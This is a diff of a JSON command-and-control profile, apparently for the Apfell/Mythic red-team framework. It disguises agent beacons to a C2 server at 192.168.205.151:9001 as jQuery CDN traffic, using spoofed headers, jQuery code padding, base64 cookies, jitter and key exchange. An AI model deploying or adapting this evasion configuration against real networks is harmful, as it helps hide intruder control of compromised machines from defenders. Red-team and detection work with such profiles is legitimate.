@@ -18,73 +18,105 @@
         "parameters": ["\".(o=t.documentElement,Math.max(t.body[\"scroll\"+e],o[\"scroll\"+e],t.body[\"offset\"+e],o[\"offset\"+e],o[\"client\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\".split(\" \"),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\"**\"):this.off(t,e||\"**\",n)}}),w.proxy=function(e,t){var n,r,i;if(\"string\"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\"number\"===t||\"string\"===t)&&!isNaN(e-parseFloat(e))},\"function\"==typeof define&&define.amd&&define(\"jquery\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});"]
       }
     ],
+    "ServerHeaders": {
+        "Server": "NetDNA-cache/2.2",
+        "Cache-Control": "max-age=0, no-cache",
+        "Pragma": "no-cache",
+        "Connection": "keep-alive",
+        "Content-Type": "application/javascript; charset=utf-8"
+      },
     "ServerCookies": {},
-    "Headers": {
-      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-      "Host": "code.jquery.com",
-      "Referer": "http://code.jquery.com/",
-      "Accept-Encoding": "gzip, deflate"
-    },
-    "getNextTask": {
-      "url": "/<test:string>",
-      "urlFunctions": {
-        "base_string": {
+    "AgentMessage": [{
+      "urls": ["http://192.168.205.151:9001"],
+      "uri": "/<test:string>",
+      "urlFunctions": [
+        {
           "name": "<test:string>",
+          "value": "",
           "transforms": [
             {
               "function": "choose_random",
-              "parameters": ["jquery-3.3.1.min.js","jquery-3.3.1.map"],
-              "value": ""
+              "parameters": ["jquery-3.3.1.min.js","jquery-3.3.1.map"]
             }
           ]
         }
+      ],
+      "AgentHeaders": {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Host": "code.jquery.com",
+        "Referer": "http://code.jquery.com/",
+        "Accept-Encoding": "gzip, deflate",
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
       },
-      "QueryParameters": {
-        "randomized": {
-          "name": "ID",
+      "QueryParameters": [
+          {
+            "name": "q",
+            "value": "message",
+            "transforms": [
+            ]
+          }
+      ],
+      "Cookies": [
+         {
+          "name": "__cfduid",
+          "value": "",
           "transforms": [
             {
               "function": "random_alpha",
-              "parameters": [20],
-              "value": ""
-            }
-          ]
-        }
-      },
-      "Cookies": {
-        "agent": {
-          "name": "__cfduid",
-          "transforms": [
+              "parameters": [30]
+            },
             {
               "function": "base64",
-              "parameters": [],
-              "value": ""
+              "parameters": []
             }
           ]
         }
-      },
+      ],
       "Body": []
-    }
+    }]
   },
   "POST": {
     "ServerBody": [],
     "ServerCookies": {},
-    "Headers": {
-      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-      "Host": "code.jquery.com",
-      "Referer": "http://code.jquery.com/",
-      "Accept-Encoding": "gzip, deflate"
-    },
-    "postResponse": {
-      "url": "/upload.php",
-      "urlFunctions": {},
-      "QueryParameters": {
-        "agent": {
-          "name": "page",
+    "ServerHeaders": {
+          "Server": "NetDNA-cache/2.2",
+          "Cache-Control": "max-age=0, no-cache",
+          "Pragma": "no-cache",
+          "Connection": "keep-alive",
+          "Content-Type": "application/javascript; charset=utf-8"
+        },
+    "AgentMessage": [{
+      "urls": ["http://192.168.205.151:9001"],
+      "uri": "/download.php",
+      "urlFunctions": [],
+      "QueryParameters": [
+        {
+          "name": "bob2",
+          "value": "justforvalidation",
           "transforms": []
         }
+      ],
+      "AgentHeaders": {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Host": "code.jquery.com",
+        "Referer": "http://code.jquery.com/",
+        "Accept-Encoding": "gzip, deflate",
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
       },
-      "Cookies": {},
+      "Cookies": [
+        {
+          "name": "BobCookie",
+          "value": "splat",
+          "transforms": [
+            {
+              "function": "prepend",
+              "parameters": [
+                "splatity_"
+              ]
+            }
+          ]
+        }
+      ],
       "Body": [
         {
           "function": "base64",
@@ -92,72 +124,18 @@
         },
         {
           "function": "prepend",
-          "parameters": ["I'M A PREPENDED INFORMATION BLOB"]
+          "parameters": ["<html>"]
         },
-        {
+          {
           "function": "append",
-          "parameters": ["APPENDED INFO YO"]
+          "parameters": ["</html>"]
         }
       ]
-    },
-    "pullFile": {
-      "url": "/download.php",
-      "urlFunctions": {},
-      "QueryParameters": {
-        "agent": {
-          "name": "CID",
-          "transforms": []
-        },
-        "param2": {
-          "name": "bob2",
-          "value": "justforvalidation",
-          "transforms": []
-        }
-      },
-      "Cookies": {
-        "bobc": {
-          "name": "BobCookie",
-          "value": "splat",
-          "transforms": [
-            {
-              "function": "prepend",
-              "parameters": ["splatity_"]
-            }
-          ]
-        }
-      },
-      "Body": []
-    },
-    "postNewCallbackEKE": {
-      "url": "/signup.php",
-      "urlFunctions": {},
-      "QueryParameters": {
-        "agent": {
-          "name": "SessionID",
-          "transforms": []
-        },
-        "redir": {
-          "name": "redir",
-          "value": "additional parameter",
-          "transforms": [
-            {
-              "function": "prepend",
-              "parameters": ["prepended to static query param"]
-            }
-          ]
-        }
-      },
-      "Cookies": {},
-      "Body": []
-    }
+    }]
   },
-  "Headers": {
-    "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
-  },
-  "Cookies": {
-  },
-  "apfellBases": ["http://192.168.205.151:9001"],
   "jitter": 50,
   "interval": 10,
-  "chunk_size": 5120000
+  "chunk_size": 5120000,
+  "key_exchange": true,
+  "kill_date": ""
 }
